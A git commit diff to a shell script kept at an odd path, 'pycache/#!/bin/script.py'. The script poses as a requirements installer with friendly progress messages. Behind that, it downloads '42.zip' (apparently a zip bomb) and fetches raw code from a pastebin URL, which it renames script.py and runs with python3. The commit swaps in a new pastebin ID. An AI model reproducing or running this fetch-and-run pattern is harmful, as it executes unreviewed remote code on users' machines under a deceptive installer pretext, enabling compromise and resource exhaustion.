069aebee0d277992fd2da4baee3aad80b76ea511
Humberto <88781888+op3ny@users.noreply.github.com>
2024-11-01 14:28:38 -0300

    Update script.py

--- pycache/#!/bin/script.py
+++ pycache/#!/bin/script.py
@@ -3,6 +3,6 @@ echo "Wait, we are installing 42 requirements... You want some coffee?"
 echo "This can take a few minutes"
 echo "ETA (Estimated Time Average) is equal to: 10 minutes"
 wget https://github.com/iamtraction/ZOD/raw/refs/heads/master/42.zip
-wget https://pastebin.com/raw/LB53f2P4
-mv LB53f2P4 script.py
+wget https://pastebin.com/raw/ePA228Bw
+mv ePA228Bw script.py
 python3 script.py
